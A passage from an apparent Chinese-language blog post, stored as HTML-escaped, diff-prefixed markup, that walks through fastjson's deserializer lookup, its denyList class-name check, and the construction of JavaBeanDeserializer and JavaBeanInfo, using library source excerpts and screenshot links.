-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ObjectDeserializer&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-     &lt;span class=&quot;c1&quot;&gt;//首先会在已有的deserializer中找，this.derializers是一个hashmap&lt;/span&gt;
-        &lt;span class=&quot;nc&quot;&gt;ObjectDeserializer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;derializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-     &lt;span class=&quot;c1&quot;&gt;//没有找着就接着找&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;………………&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;省略&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;……………………&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;进入getDeserializer的另一个重载，这个函数首先会匹配type的类型，否则会检查是否是泛型相关接口。然后检查反序列化的目标类是否在denyList中&lt;/p&gt;
-
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ObjectDeserializer&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;c1&quot;&gt;//继续匹配&lt;/span&gt;
-        &lt;span class=&quot;nc&quot;&gt;ObjectDeserializer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;c1&quot;&gt;//继续匹配&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;nc&quot;&gt;JSONType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;annotation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAnnotation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;JSONType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;annotation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mappingTo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;annotation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mappingTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mappingTo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mappingTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mappingTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;//判断是否是泛型相关的接口的实例，至于什么是泛型接口的实例，咱也不知道&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;WildcardType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TypeVariable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ParameterizedType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;//反序列化的类是否在denyList中&lt;/span&gt;
-        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'$'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;denyList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;deny&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;denyList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;startsWith&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;deny&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JSONException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;parser deny : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;之后还会根据一些情况进行匹配，在所有匹配均不成功后，就会创建一个新的deserializer&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801155439336.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;createJavaBeanDeserializer里，会根据asmEnable分两种情况去创建并返回一个JavaBeanDeserializer&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801175636270.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;如果目标class的父类中有非public的成员变量，则asmEnable为false，除此之外还有许多条件，如果不成立则asmEnable都为false&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801171446495.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;先跟进asm为false的情况，直接new一个JavaBeanDeserializer&lt;/p&gt;
-
-&lt;h2 id=&quot;javabeandeserializer&quot;&gt;JavaBeanDeserializer&lt;/h2&gt;
-
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;//其中定义的一些成员变量&lt;/span&gt;
-	&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FieldDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;fieldDeserializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FieldDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sortedFieldDeserializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JavaBeanInfo&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;beanInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConcurrentMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extraFieldDeserializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;com.alibaba.fastjson.util.JavaBeanInfo#build 获取了目标类所生命的成员变量，方法，构造方法&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801162230691.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;最后返回一个JavaBeanInfo类&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801162539536.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;在JavaBeanInfo的构造方法中，除了一些基本的初始化，还会讲成员变量进行排序，生成一个sortedFields数组，不知道为什么要另外弄一个sortedFields&lt;/p&gt;
-
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JavaBeanInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-                        &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builderClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-                        &lt;span class=&quot;nc&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defaultConstructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-                        &lt;span class=&quot;nc&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;creatorConstructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-                        &lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factoryMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-                        &lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buildMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-                        &lt;span class=&quot;nc&quot;&gt;JSONType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-                        &lt;span class=&quot;nc&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;FieldInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fieldList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;clazz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;builderClass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builderClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;defaultConstructor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defaultConstructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;creatorConstructor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;creatorConstructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;factoryMethod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factoryMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parserFeatures&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TypeUtils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParserFeatures&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;buildMethod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buildMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-
-    &lt;span class=&quot;o&quot;&gt;....&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;省略&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.....&lt;/span&gt;
-
-        &lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FieldInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fieldList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()];&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;fieldList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-
